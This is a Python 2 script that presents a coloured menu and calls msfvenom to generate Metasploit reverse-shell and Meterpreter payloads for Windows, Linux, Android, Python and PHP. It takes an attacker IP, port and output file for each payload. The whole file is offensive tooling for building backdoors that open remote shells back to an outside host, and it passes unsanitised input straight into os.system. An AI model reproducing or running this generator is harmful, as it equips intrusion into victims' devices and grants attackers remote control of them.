#!/usr/bin/python
import os
import sys
import time
from arts import pm_art
#30 Black
#31 Red
#32 Green
#33 Yellow
#34 Blue
#35 Magenta
#36 Cyan
#37 White
print (pm_art())
print "\n\n\n\33[34m 1)Windows"
print "\33[33m 2)Linux"
print "\33[32m 3)Android"
print "\33[31m 4)Multi \n\n"
anwser = raw_input("\33[37m>>> ")
if anwser == str(1):
    os.system('clear')
    print '\33[34m' + pm_art()
    print ('\n\n\n \33[36m1)Shell')
    print ('\33[34m 2)Meterpreter')
    anwser1 = raw_input('\n\n >>> ')
    if anwser1 == str(1):
        os.system('clear')
        print '\33[34m' + pm_art()
        print("\n\n\n\33[34m 1)windows/shell/reverse_tcp")
        print("\33[34m 2)windows/shell/reverse_tcp_allports")
        print("\33[34m 3)windows/shell/reverse_ipv6_tcp \n\n\n ")
        j1 = raw_input(">>> ")
        if j1 == str(1):
            os.system('clear')
            print (pm_art())
            ip = raw_input('\33[31m put your IP/HOST : ')
            port = raw_input('\33[36m put your open port \33[33m[\33[31m!\33[33m]\33[36m YOUR OPEN : ')
            lct = raw_input('\33[37m put location of the payload (root/Desktop/payload.exe) : ')
            os.system('msfvenom -p windows/shell/reverse_tcp LHOST='+ip+' LPORT='+port+' -o '+lct )
            os.system('clear')
            sys.exit('Thank you for using Me')
        elif j1 == str(2):
            os.system('clear')
            print (pm_art())
            ip = raw_input('\33[31m put your IP/HOST : ')
            port = raw_input('\33[36m put your open port \33[33m[\33[31m!\33[33m]\33[36m YOUR OPEN : ')
            lct = raw_input('\33[37m put location of the payload (root/Desktop/payload.exe) : ')
            os.system('msfvenom -p windows/shell/reverse_tcp_allports LHOST=' + ip + ' LPORT=' + port + ' -o ' + lct)
            os.system('clear')
            sys.exit('Thank you for using Me')
        elif j1 == str(3):
            os.system('clear')
            print (pm_art())
            ip = raw_input('\33[31m put your IP/HOST : ')
            port = raw_input('\33[36m put your open port \33[33m[\33[31m!\33[33m]\33[36m YOUR OPEN : ')
            lct = raw_input('\33[37m put location of the payload (root/Desktop/payload.exe) : ')
            os.system('msfvenom -p windows/shell/reverse_ipv6_tcp LHOST=' + ip + ' LPORT=' + port + ' -o ' + lct)
            os.system('clear')
            sys.exit('Thank you for using Me')
        else:
            os.system('clear')
            print "\33[31m Error 404 Logic Not Foand "
            time.sleep(3)
            os.system('cmatrix -C blue')
    elif anwser1 == str(2):
        os.system('clear')
        print '\33[34m' + pm_art()
        print("\n\n\n\33[34m 1)windows/meterpreter/reverse_tcp ")
        print("\33[34m 2)windows/meterpreter/reverse_https ")
        print("\33[34m 3)windows/meterpreter/reverse_http \n\n\n ")
        j2 = raw_input(">>> ")
        if j2 == str(1):
            os.system('clear')
            print (pm_art())
            ip = raw_input('\33[31m put your IP/HOST : ')
            port = raw_input('\33[36m put your open port \33[33m[\33[31m!\33[33m]\33[36m YOUR OPEN : ')
            lct = raw_input('\33[37m put location of the payload (/root/Desktop/payload.exe) : ')
            os.system('msfvenom -p windows/meterpreter/reverse_tcp LHOST=' + ip + ' LPORT=' + port + ' -o ' + lct)
            os.system('clear')
            sys.exit('Thank you for using Me')
        elif j2 == str(2):
            os.system('clear')
            print (pm_art())
            ip = raw_input('\33[31m put your IP/HOST : ')
            port = raw_input('\33[36m put your open port \33[33m[\33[31m!\33[33m]\33[36m YOUR OPEN : ')
            lct = raw_input('\33[37m put location of the payload (/root/Desktop/payload.exe) : ')
            os.system('msfvenom -p windows/meterpreter/reverse_https LHOST=' + ip + ' LPORT=' + port + ' -o ' + lct)
            os.system('clear')
            sys.exit('Thank you for using Me')
        elif j2 == str(3):
            os.system('clear')
            print (pm_art())
            ip = raw_input('\33[31m put your IP/HOST : ')
            port = raw_input('\33[36m put your open port \33[33m[\33[31m!\33[33m]\33[36m YOUR OPEN : ')
            lct = raw_input('\33[37m put location of the payload (/root/Desktop/payload.exe) : ')
            os.system('msfvenom -p windows/meterpreter/reverse_http LHOST=' + ip + ' LPORT=' + port + ' -o ' + lct)
            os.system('clear')
            sys.exit('Thank you for using Me')
        else:
            os.system('cmatrix -C blue')
elif anwser == str(2):
    os.system('clear')
    print '\33[33m' + pm_art()
    print("\n\n\n\33[33m 1)x86")
    print("\33[33m 2)x64\n\n\n ")
    anwser2 = raw_input(">>> ")
    if anwser2 == str(1):
        print '\33[33m' + pm_art()
        print("\n\n\n\33[34m 1)linux/x86/meterpreter/reverse_tcp ")
        print("\33[34m 2)linux/x86/meterpreter/reverse_ipv6_tcp ")
        print("\33[34m 3)linux/x86/meterpreter/reverse_tcp_uuid  \n\n\n ")
        j35 = raw_input(">>> ")
        if j35 == str(1):
            os.system('clear')
            print (pm_art())
            ip = raw_input('\33[31m put your IP/HOST : ')
            port = raw_input('\33[36m put your open port \33[33m[\33[31m!\33[33m]\33[36m YOUR OPEN : ')
            location6 = raw_input('\33[37m put location of the payload (/root/Desktop/payload.sh) : ')
            os.system('msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=' + ip + ' LPORT=' + port + ' -o ' + location6)
            os.system('clear')
            sys.exit('Thank you for using Me')
        elif j35 == str(2):
            os.system('clear')
            print (pm_art())
            ip = raw_input('\33[31m put your IP/HOST : ')
            port = raw_input('\33[36m put your open port \33[33m[\33[31m!\33[33m]\33[36m YOUR OPEN : ')
            location7 = raw_input('\33[37m put location of the payload (/root/Desktop/payload.sh) : ')
            os.system('msfvenom -p linux/x86/meterpreter/reverse_ipv6_tcp LHOST=' + ip + ' LPORT=' + port + ' -o ' + location7)
            os.system('clear')
            sys.exit('Thank you for using Me')
        elif j35 == str(3):
            os.system('clear')
            print (pm_art())
            ip = raw_input('\33[31m put your IP/HOST : ')
            port = raw_input('\33[36m put your open port \33[33m[\33[31m!\33[33m]\33[36m YOUR OPEN : ')
            location8 = raw_input('\33[37m put location of the payload (/root/Desktop/payload.sh) : ')
            os.system('msfvenom -p linux/x86/meterpreter/reverse_tcp_uuid LHOST=' + ip + ' LPORT=' + port + ' -o ' + location8)
            os.system('clear')
            sys.exit('Thank you for using Me')
        else:
            os.system('clear')
            os.system('cmatrix -B -C yellow')
    elif anwser2 == str(2):
        print '\33[33m' + pm_art()
        print("\n\n\n\33[34m 1)linux/x64/meterpreter/reverse_tcp ")
        print("\33[34m 2)linux/x64/meterpreter/reverse_ipv6_tcp ")
        print("\33[34m 3)linux/x64/meterpreter/reverse_tcp_uuid  \n\n\n ")
        j3 = raw_input(">>> ")
        if j3 == str(1):
            os.system('clear')
            print (pm_art())
            ip = raw_input('\33[31m put your IP/HOST : ')
            port = raw_input('\33[36m put your open port \33[33m[\33[31m!\33[33m]\33[36m YOUR OPEN : ')
            location9 = raw_input('\33[37m put location of the payload (/root/Desktop/payload.sh) : ')
            os.system('msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=' + ip + ' LPORT=' + port + ' -o ' + location9)
            os.system('clear')
            sys.exit('Thank you for using Me')
        elif j3 == str(2):
             os.system('clear')
             print (pm_art())
             ip = raw_input('\33[31m put your IP/HOST : ')
             port = raw_input('\33[36m put your open port \33[33m[\33[31m!\33[33m]\33[36m YOUR OPEN : ')
             location10 = raw_input('\33[37m put location of the payload (/root/Desktop/payload.sh) : ')
             os.system('msfvenom -p linux/x64/meterpreter/reverse_ipv6_tcp LHOST=' + ip + ' LPORT=' + port + ' -o ' + location10)
             os.system('clear')
             sys.exit('Thank you for using Me')
        elif j3 == str(3):
            os.system('clear')
            print (pm_art())
            ip = raw_input('\33[31m put your IP/HOST : ')
            port = raw_input('\33[36m put your open port \33[33m[\33[31m!\33[33m]\33[36m YOUR OPEN : ')
            location11 = raw_input('\33[37m put location of the payload (/root/Desktop/payload.sh) : ')
            os.system('msfvenom -p linux/x64/meterpreter/reverse_tcp_uuid LHOST=' + ip + ' LPORT=' + port + ' -o ' + location11)
            os.system('clear')
            sys.exit('Thank you for using Me')
        else:
            os.system('clear')
            os.system('cmatrix -B -C yellow')
elif anwser == str(3):
        os.system('clear')
        print '\33[32m' + pm_art()
        print("\n\n\n\33[32m 1)android/meterpreter/reverse_tcp   ")
        print("\33[32m 2)android/meterpreter/reverse_https  ")
        print("\33[32m 3)android/meterpreter/reverse_http    \n\n\n ")
        j4 = raw_input(">>> ")
        if j4 == str(1):
            os.system('clear')
            print (pm_art())
            ip = raw_input('\33[31m put your IP/HOST : ')
            port = raw_input('\33[36m put your open port \33[33m[\33[31m!\33[33m]\33[36m YOUR OPEN : ')
            location = raw_input('\33[37m put location of the payload (/root/Desktop/payload.apk) : ')
            os.system('msfvenom -p android/meterpreter/reverse_tcp LHOST=' + ip + ' LPORT=' + port + ' -o ' + location)
            os.system('clear')
            sys.exit('Thank you for using Me')
        elif j4 == str(2):
            os.system('clear')
            print (pm_art())
            ip = raw_input('\33[31m put your IP/HOST : ')
            port = raw_input('\33[36m put your open port \33[33m[\33[31m!\33[33m]\33[36m YOUR OPEN : ')
            location = raw_input('\33[37m put location of the payload (/root/Desktop/payload.apk) : ')
            os.system('msfvenom -p android/meterpreter/reverse_https LHOST=' + ip + ' LPORT=' + port + ' -o ' + location)
            os.system('clear')
            sys.exit('Thank you for using Me')
        elif j4 == str(3):
            os.system('clear')
            print (pm_art())
            ip = raw_input('\33[31m put your IP/HOST : ')
            port = raw_input('\33[36m put your open port \33[33m[\33[31m!\33[33m]\33[36m YOUR OPEN : ')
            location = raw_input('\33[37m put location of the payload (/root/Desktop/payload.apk) : ')
            os.system('msfvenom -p android/meterpreter/reverse_http LHOST=' + ip + ' LPORT=' + port + ' -o ' + location)
            os.system('clear')
            sys.exit('Thank you for using Me')
        else:
            os.system('clear')
            os.system('cmatrix -B')
elif anwser == str(4):
             os.system(('clear'))
             print pm_art()
             print "\n\n\n\33[33m 1)python"
             print "\33[31m 2)php \n\n\n"
             wow = raw_input('\33[37m>>>')
             if wow == str(1):
                 print '\33[33m'+ pm_art()
                 print ''
                 print "\33[33m1)python/meterpreter/reverse_tcp "
                 print "\33[33m2)python/meterpreter/reverse_http"
                 print "\33[33m2)python/meterpreter/reverse_https"
                 f = raw_input("\33[37m>>>")
                 if f == str(1):
                     os.system('clear')
                     print (pm_art())
                     ip = raw_input('\33[31m put your IP/HOST : ')
                     port = raw_input('\33[36m put your open port \33[33m[\33[31m!\33[33m]\33[36m YOUR OPEN : ')
                     location = raw_input('\33[37m put location of the payload (/root/Desktop/payload.py) : ')
                     os.system('msfvenom -p python/meterpreter/reverse_tcp LHOST=' + ip + ' LPORT=' + port + ' -o ' + location)
                     os.system('clear')
                     sys.exit('Thank you for using Me')
                 elif f == str(2):
                     os.system('clear')
                     print (pm_art())
                     ip = raw_input('\33[31m put your IP/HOST : ')
                     port = raw_input('\33[36m put your open port \33[33m[\33[31m!\33[33m]\33[36m YOUR OPEN : ')
                     location = raw_input('\33[37m put location of the payload (/root/Desktop/payload.py) : ')
                     os.system('msfvenom -p python/meterpreter/reverse_http LHOST=' + ip + ' LPORT=' + port + ' -o ' + location)
                     os.system('clear')
                     sys.exit('Thank you for using Me')
                 elif f == str(3):
                     os.system('clear')
                     print (pm_art())
                     ip = raw_input('\33[31m put your IP/HOST : ')
                     port = raw_input('\33[36m put your open port \33[33m[\33[31m!\33[33m]\33[36m YOUR OPEN : ')
                     location = raw_input('\33[37m put location of the payload (/root/Desktop/payload.py) : ')
                     os.system('msfvenom -p python/meterpreter/reverse_https LHOST=' + ip + ' LPORT=' + port + ' -o ' + location)
                     os.system('clear')
                     sys.exit('Thank you for using Me')
             elif wow == str(2):
                 print '\33[31m' + pm_art()
                 print ''
                 print "\33[31m1)php/meterpreter/reverse_tcp   "
                 print "\33[31m2)php/meterpreter/bind_tcp "
                 print "\33[31m2)php/meterpreter/bind_tcp_ipv6 "
                 f = raw_input("\33[37m>>>")
                 if f == str(1):
                     os.system('clear')
                     print (pm_art())
                     ip = raw_input('\33[31m put your IP/HOST : ')
                     port = raw_input('\33[36m put your open port \33[33m[\33[31m!\33[33m]\33[36m YOUR OPEN : ')
                     location = raw_input('\33[37m put location of the payload (/root/Desktop/payload.php) : ')
                     os.system('msfvenom -p php/meterpreter/reverse_tcp LHOST=' + ip + ' LPORT=' + port + ' -o ' + location)
                     os.system('clear')
                     sys.exit('Thank you for using Me')
                 elif f == str(2):
                     os.system('clear')
                     print (pm_art())
                     ip = raw_input('\33[31m put your IP/HOST : ')
                     port = raw_input('\33[36m put your open port \33[33m[\33[31m!\33[33m]\33[36m YOUR OPEN : ')
                     location = raw_input('\33[37m put location of the payload (/root/Desktop/payload.php) : ')
                     os.system('msfvenom -p php/meterpreter/bind_tcp LHOST=' + ip + ' LPORT=' + port + ' -o ' + location)
                     os.system('clear')
                     sys.exit('Thank you for using Me')
                 elif f == str(3):
                     os.system('clear')
                     print (pm_art())
                     ip = raw_input('\33[31m put your IP/HOST : ')
                     port = raw_input('\33[36m put your open port \33[33m[\33[31m!\33[33m]\33[36m YOUR OPEN : ')
                     location = raw_input('\33[37m put location of the payload (/root/Desktop/payload.php) : ')
                     os.system('msfvenom -p php/meterpreter/bind_tcp_ipv6 LHOST=' + ip + ' LPORT=' + port + ' -o ' + location)
                     os.system('clear')
                     sys.exit('Thank you for using Me')
